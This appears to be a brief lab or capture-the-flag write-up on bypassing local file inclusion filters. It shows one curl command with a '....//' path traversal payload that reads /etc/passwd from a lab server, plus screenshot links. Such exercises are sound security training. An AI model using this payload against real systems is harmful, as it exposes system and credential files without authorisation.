# [Basic Bypasses](Basic%20Bypasses.md)
### The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt
![](Screenshot%202026-06-30%20at%2014.29.10.png)

```shell
curl http://154.57.164.72:32003/index.php?language=languages/....//....//....//....//etc/passwd
```
![](Screenshot%202026-06-30%20at%2014.39.15.png)
![](Screenshot%202026-06-30%20at%2014.40.28.png)
